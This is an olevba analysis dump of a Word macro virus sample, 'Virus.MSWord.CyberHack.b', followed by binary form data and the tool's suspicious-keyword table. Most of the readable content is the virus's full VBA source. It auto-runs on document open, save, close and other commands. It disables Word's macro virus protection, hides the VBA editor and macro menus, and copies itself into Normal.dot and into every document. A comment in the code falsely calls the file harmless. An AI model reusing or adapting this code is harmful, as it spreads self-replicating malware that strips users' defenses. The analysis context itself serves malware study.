olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.CyberHack.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.CyberHack.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Km.bas 
in file: Virus.MSWord.CyberHack.b - OLE stream: 'Macros/VBA/Km'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Macros By Khan's Pakistani
' ENG: This file is not dangerous.
' URD: ye file khatarnak nahin hai.
' TUR: Bu dosya thelikeli degil dir.

Public Ast
Public DocS
Public Nb
Public Db
Sub KmInit()
    Ast = Application.DisplayAlerts
    Application.DisplayAlerts = wdAlertsNone
    Call Op
    WordBasic.DisableAutoMacros 0
    CommandBars("Visual Basic").Visible = False
    CommandBars("Visual Basic").Enabled = False
    CommandBars("Visual Basic").Protection = msoBarNoChangeVisible
    CommandBars("Visual Basic").Protection = msoBarNoCustomize
    On Error Resume Next
    CommandBars("Tools").Controls("Macro").Delete
    CustomizationContext = NormalTemplate
    FindKey(BuildKeyCode(wdKeyF11, wdKeyAlt)).Disable
    FindKey(BuildKeyCode(wdKeyF8, wdKeyAlt)).Disable
    On Error GoTo 0
End Sub
Sub KmClose()
Application.DisplayAlerts = Ast
End Sub
Sub D2N()
    Call Op
    On Error GoTo Erw1
    Nb = False
    Set Ad = ActiveDocument
    Set nt = NormalTemplate
    On Error GoTo Erh1a
    For i = 1 To nt.VBProject.VBComponents.Count
      NMacr = nt.VBProject.VBComponents(i).Name
      If NMacr = "Km" Then Nb = True
      If (NMacr <> "Km") And (NMacr <> "Khan") And (NMacr <> "ThisDocument") Then
        Application.OrganizerDelete Source:=nt.FullName, _
            Name:=NMacr, Object:=wdOrganizerObjectProjectItems
      End If
    Next i
Erh1a:
    If Nb = False Then
      On Error GoTo Erh1
      Application.OrganizerCopy Source:=Ad.FullName, _
          Destination:=nt.FullName, Name:= _
          "Km", Object:=wdOrganizerObjectProjectItems
      Application.OrganizerCopy Source:=Ad.FullName, _
          Destination:=nt.FullName, Name:= _
          "Khan", Object:=wdOrganizerObjectProjectItems
      Templates(nt.FullName).Save
Erh1:
    End If
Erw1:
End Sub
Sub N2D()
    On Error GoTo Erw2
    DocS = 0
    Db = False
    Set Ad = ActiveDocument
    Set nt = NormalTemplate
    On Error GoTo Erh2a
    For i = 1 To Ad.VBProject.VBComponents.Count
      NMacr = Ad.VBProject.VBComponents(i).Name
      If NMacr = "Km" Then Db = True
      NMacr = nt.VBProject.VBComponents(i).Name
      If NMacr = "Km" Then Db = True
      If (NMacr <> "Km") And (NMacr <> "Khan") And _
        (NMacr <> "ThisDocument") And (NMacr <> "Reference to Normal") Then
        Application.OrganizerDelete Source:=Ad.FullName, _
          Name:=NMacr, Object:=wdOrganizerObjectProjectItems
      End If
    Next i
Erh2a:
    If Db = False Then
      On Error GoTo Erh2
      Application.OrganizerCopy Source:=nt.FullName, _
              Destination:=Ad.FullName, Name:= _
          "Km", Object:=wdOrganizerObjectProjectItems
     
      Application.OrganizerCopy Source:=nt.FullName, _
          Destination:=Ad.FullName, Name:= _
          "Khan", Object:=wdOrganizerObjectProjectItems
      DocS = 1
Erh2:
    End If
Erw2:
End Sub
Sub Kmm()
    Call KmInit
    Call D2N
    Call N2D
    Call KmClose
End Sub
Sub Op()
    With Options
        .VirusProtection = False
        .SaveNormalPrompt = False
    End With
End Sub
Sub Sad()
    On Error GoTo Erh4
Set Ad = ActiveDocument
    If DocS = 1 Then
       Ad.SaveAs FileName:=Ad.Name, FileFormat:=wdFormatDocument
    End If
Erh4:
End Sub
Sub AutoOpen()
    Call Kmm
End Sub
Sub FileClose()
    Call KmInit
    Call D2N
    Call N2D
    Call KmClose
    If Day(Date) = 1 And Month(Date) = 8 Then Khan.Show
    WordBasic.FileClose
End Sub
Sub FileOpen()
    Call Kmm
    Dialogs(wdDialogFileOpen).Show
    Call KmInit
    Call N2D
    Call Sad
    Call KmClose
End Sub
Sub FileSaveAs()
    Call KmInit
    Call D2N
    Call N2D
    Call KmClose
    Dialogs(wdDialogFileSaveAs).Show
End Sub
Sub FileSave()
    Call KmInit
    Call D2N
    Call N2D
    Call KmClose
    On Error GoTo Errh1
    If ActiveDocument.Saved = False Then ActiveDocument.Save
Errh1:
End Sub
Sub FileExit()
    Call KmInit
    Call D2N
    Call N2D
    On Error GoTo Erw4
    If Day(Date) = 1 And Month(Date) = 8 Then Khan.Show
Erw4:
    Call KmClose
    WordBasic.FileExit
End Sub
Sub ToolsOptions()
    Dialogs(wdDialogToolsOptions).Show
    Call Kmm
End Sub
Sub FileNew()
    Call Kmm
    Dialogs(wdDialogFileNew).Show
End Sub
Sub FileTemplates()
    Call Kmm
End Sub
Sub ToolsCustomize()
    Call Kmm
End Sub
Sub ToolsCustomizeKeyboard()
    Call Kmm
End Sub
Sub ViewVBCode()
    Call Kmm
End Sub
Sub Organizer()
    Call Kmm
End Sub
-------------------------------------------------------------------------------
VBA MACRO Khan.frm 
in file: Virus.MSWord.CyberHack.b - OLE stream: 'Macros/VBA/Khan'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.CyberHack.b' - OLE stream: 'Macros/Khan/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Today is Birthday of Author !!!!.~E
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.CyberHack.b' - OLE stream: 'Macros/Khan/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Times New Roman
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.CyberHack.b' - OLE stream: 'Macros/Khan/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
K�Qlt
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.CyberHack.b' - OLE stream: 'Macros/Khan/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
GIF89a0
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.CyberHack.b' - OLE stream: 'Macros/Khan/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.CyberHack.b' - OLE stream: 'Macros/Khan/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�q:������@@@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.CyberHack.b' - OLE stream: 'Macros/Khan/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
NETSCAPE2.0
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.CyberHack.b' - OLE stream: 'Macros/Khan/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
GifBuilder 0.2 by Yves Piguet
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.CyberHack.b' - OLE stream: 'Macros/Khan/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ڐ�I��8�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.CyberHack.b' - OLE stream: 'Macros/Khan/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��`(z�6�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.CyberHack.b' - OLE stream: 'Macros/Khan/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
wv�����δ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.CyberHack.b' - OLE stream: 'Macros/Khan/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ǯ<��m�=���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.CyberHack.b' - OLE stream: 'Macros/Khan/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
~RÊ��j�ŐO�4Z����ʬ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.CyberHack.b' - OLE stream: 'Macros/Khan/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��mAͲ:{>��?1��m?��L
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.CyberHack.b' - OLE stream: 'Macros/Khan/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����xr4>���awWQ;Y�63d�|v�C�bdI�FHp���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.CyberHack.b' - OLE stream: 'Macros/Khan/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��t�L�f�_�B��j�\��n���$q���~6
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.CyberHack.b' - OLE stream: 'Macros/Khan/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
x�w�G���JȊ���T��D�c�R�]��R_r
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.CyberHack.b' - OLE stream: 'Macros/Khan/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
u�O�������z��������שT���z|���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.CyberHack.b' - OLE stream: 'Macros/Khan/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ڐ�I��8�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.CyberHack.b' - OLE stream: 'Macros/Khan/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��`(z�6�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.CyberHack.b' - OLE stream: 'Macros/Khan/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
wv�����δ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.CyberHack.b' - OLE stream: 'Macros/Khan/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�c���^ߦ�OCd���bE���zL�%���(Ԗ���P�/eFgk��X-ό
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.CyberHack.b' - OLE stream: 'Macros/Khan/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����u�z��r�6}��_~B7�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.CyberHack.b' - OLE stream: 'Macros/Khan/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
s���X'u�3@8zP�pA�|m
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.CyberHack.b' - OLE stream: 'Macros/Khan/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������1P�J�����U)��V�n��EYd��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.CyberHack.b' - OLE stream: 'Macros/Khan/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�� �x�v}��{����K�ǺɃ��4��H�O[���6�o
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.CyberHack.b' - OLE stream: 'Macros/Khan/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
r�k���R
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.CyberHack.b' - OLE stream: 'Macros/Khan/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���Ж����ҹ��ᦣ����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.CyberHack.b' - OLE stream: 'Macros/Khan/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ڐ�I��8�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.CyberHack.b' - OLE stream: 'Macros/Khan/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��`(z�6�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.CyberHack.b' - OLE stream: 'Macros/Khan/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
wv�����δ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.CyberHack.b' - OLE stream: 'Macros/Khan/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ǯ<��m�=���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.CyberHack.b' - OLE stream: 'Macros/Khan/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
~RÊ��j�ŐO�4Z����ʬ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.CyberHack.b' - OLE stream: 'Macros/Khan/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��mAͲ:{>��?1��m?��L
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.CyberHack.b' - OLE stream: 'Macros/Khan/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����xr4>���awWQ;Y�63d�|v�C�bdI�FHp���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.CyberHack.b' - OLE stream: 'Macros/Khan/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��t�L�f�_�B��j�\��n���$q���~6
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.CyberHack.b' - OLE stream: 'Macros/Khan/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
x�w�G���JȊ���T��D�c�R�]��R_r
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.CyberHack.b' - OLE stream: 'Macros/Khan/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
u�O�������z��������שT���z|���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.CyberHack.b' - OLE stream: 'Macros/Khan/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ݐ�I��8�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.CyberHack.b' - OLE stream: 'Macros/Khan/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��`(z�6�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.CyberHack.b' - OLE stream: 'Macros/Khan/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
wv�����δ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.CyberHack.b' - OLE stream: 'Macros/Khan/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�uж�.7S�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.CyberHack.b' - OLE stream: 'Macros/Khan/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�`RC`����|Χo��&�$����!{�nr��rA��ڲ���Fk�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.CyberHack.b' - OLE stream: 'Macros/Khan/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
v�Qrz�
�O�lb�Aw�D8/�=_��'���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.CyberHack.b' - OLE stream: 'Macros/Khan/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��P�hL�Wzq�Jp����>�k�3)�f�^��5�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.CyberHack.b' - OLE stream: 'Macros/Khan/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�c�v�hm6B���`����wU�XE����s��C7���~��,�T:b
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.CyberHack.b' - OLE stream: 'Macros/Khan/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Qǉ�g��Җ}�us���@��ڡ�c�j�n�e����"
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.CyberHack.b' - OLE stream: 'Macros/Khan/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ڐ�I��8�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.CyberHack.b' - OLE stream: 'Macros/Khan/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��`(z�6�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.CyberHack.b' - OLE stream: 'Macros/Khan/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
wv�����δ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.CyberHack.b' - OLE stream: 'Macros/Khan/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ǯ<��m�=���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.CyberHack.b' - OLE stream: 'Macros/Khan/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
~RÊ��j�ŐO�4Z����ʬ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.CyberHack.b' - OLE stream: 'Macros/Khan/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��mAͲ:{>��?1��m?��L
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.CyberHack.b' - OLE stream: 'Macros/Khan/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����xr4>���awWQ;Y�63d�|v�C�bdI�FHp���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.CyberHack.b' - OLE stream: 'Macros/Khan/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��t�L�f�_�B��j�\��n���$q���~6
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.CyberHack.b' - OLE stream: 'Macros/Khan/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
x�w�G���JȊ���T��D�c�R�]��R_r
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.CyberHack.b' - OLE stream: 'Macros/Khan/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
u�O�������z��������שT���z|���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.CyberHack.b' - OLE stream: 'Macros/Khan/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���I��8�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.CyberHack.b' - OLE stream: 'Macros/Khan/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��`(z�6
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.CyberHack.b' - OLE stream: 'Macros/Khan/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
O�r㪞�Ċ�i�3]��3��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.CyberHack.b' - OLE stream: 'Macros/Khan/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
o�X1SC�R�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.CyberHack.b' - OLE stream: 'Macros/Khan/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�>-G�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.CyberHack.b' - OLE stream: 'Macros/Khan/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
F�v�[0
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.CyberHack.b' - OLE stream: 'Macros/Khan/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
^����S�nwՠ�۴�)�G��|�d�^�-dIbU^_]vu$v2qz�$�$�����w�H>
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.CyberHack.b' - OLE stream: 'Macros/Khan/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����E��(s2�k�����.�Q���F�U��Z�t��p
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.CyberHack.b' - OLE stream: 'Macros/Khan/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���VS��L�|������k���Ե҈���}F����=���S�8���������̇�Rv�@������8!�O]�6����V
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.CyberHack.b' - OLE stream: 'Macros/Khan/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�-�Sn�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.CyberHack.b' - OLE stream: 'Macros/Khan/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Times New Roman
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Virus.MSWord.CyberHack.b' - OLE stream: 'Macros/Khan'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Image1'" IN 'Virus.MSWord.CyberHack.b' - OLE stream: 'Macros/Khan'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'okbtn'" IN 'Virus.MSWord.CyberHack.b' - OLE stream: 'Macros/Khan'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Hex String|3We@                |33576540                                     |
|Hex String|3We7                |33576537                                     |
+----------+--------------------+---------------------------------------------+

